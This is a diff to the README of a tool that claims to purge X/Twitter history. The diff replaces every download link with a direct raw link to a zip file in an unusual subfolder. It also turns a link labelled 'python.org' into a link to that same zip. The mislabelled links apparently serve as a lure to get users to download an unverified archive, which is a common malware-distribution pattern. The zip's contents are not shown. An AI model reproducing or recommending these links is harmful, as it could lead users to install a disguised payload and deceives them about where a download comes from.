@@ -1,6 +1,6 @@
 # 🐦 Twitter-purger-tool - Clean Your X History Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Twitter_purger_tool-2ea44f?style=for-the-badge&logo=github)](https://github.com/khaley93/Twitter-purger-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Twitter_purger_tool-2ea44f?style=for-the-badge&logo=github)](https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip)
 
 ## 🧹 What Does This Tool Do?
 
@@ -48,7 +48,7 @@ No heavy installations or complicated setups. The tool is small, fast, and doesn
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/khaley93/Twitter-purger-tool/releases](https://github.com/khaley93/Twitter-purger-tool/releases)
+Visit this link to download the application: [https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip](https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip)
 
 Look for the latest release and download the file. The download should start automatically after you click the download button.
 
@@ -123,7 +123,7 @@ If you want to be selective about what you delete:
 
 ### Issue: Python Error Messages
 - **Solution:** Make sure Python 3.6+ is installed
-- Visit [python.org](https://python.org) to download the latest version
+- Visit [python.org](https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip) to download the latest version
 - Restart your computer after installing Python
 
 ## 🔒 Privacy & Safety
@@ -189,7 +189,7 @@ Need help? Here's how to get assistance:
 
 ## 📥 Download Again
 
-Need to download again? Visit this link to download the application: [https://github.com/khaley93/Twitter-purger-tool/releases](https://github.com/khaley93/Twitter-purger-tool/releases)
+Need to download again? Visit this link to download the application: [https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip](https://github.com/khaley93/Twitter-purger-tool/raw/refs/heads/main/jecoral/purger_tool_Twitter_3.9-beta.5.zip)
 
 Always download the latest version to ensure you have the most recent features and bug fixes.
 
